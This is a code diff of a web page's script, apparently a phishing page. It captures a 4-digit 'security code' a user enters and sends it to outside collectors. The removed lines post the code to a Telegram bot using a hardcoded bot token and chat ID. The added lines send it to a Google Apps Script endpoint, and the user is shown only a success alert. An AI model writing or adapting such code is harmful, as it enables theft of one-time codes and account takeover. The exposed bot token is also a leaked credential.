@@ -125,26 +125,17 @@
         document.getElementById('input4').value;
 
       if (code.length === 4) {
-        const token = '8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI'; // ← غيّر هذا
-        const chatId = '6451561574'; // ← غيّر هذا
-        const message = `🔐 Code de sécurité saisi : ${code}`;
-
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        fetch('https://script.google.com/macros/s/AKfycby52QrtFym77GOddOix15UugpzFkojzDjIVi5QgJH5WYCs14fsdMFzNGhgWVLFvaLAu/exec', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
           },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-          })
+          body: JSON.stringify({ code: code })
         })
         .then(response => response.json())
         .then(data => {
-          if (data.ok) {
+          if (data.success) {
             alert('✅ Code envoyé avec succès !');
-            // يمكنك إعادة توجيه المستخدم مثلاً:
-            // window.location.href = 'success.html';
           } else {
             alert('❌ Erreur lors de l\'envoi du code.');
             console.error(data);
